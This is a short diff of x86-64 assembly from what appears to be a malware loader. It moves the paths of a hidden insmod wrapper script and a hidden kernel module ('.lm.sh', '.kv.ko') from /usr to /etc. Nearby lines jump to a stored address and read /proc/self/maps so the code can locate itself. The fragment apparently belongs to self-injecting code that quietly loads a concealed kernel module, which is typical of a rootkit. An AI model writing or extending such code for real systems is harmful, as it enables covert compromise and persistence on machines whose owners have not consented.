@@ -133,10 +133,10 @@ load_ebx:
     jmpq *%r8                       # 41 ff e0                 ;   jmp to address stored
 
     # wrapper for insmod and module name
-    insmodwrapper:      .asciz "/usr/.lm.sh"
+    insmodwrapper:      .asciz "/etc/.lm.sh"
 
     # rename this to real name
-    modname:              .asciz "/usr/.kv.ko"
+    modname:              .asciz "/etc/.kv.ko"
 
     # This is so I can find myself
     path:               .asciz "/proc/self/maps"
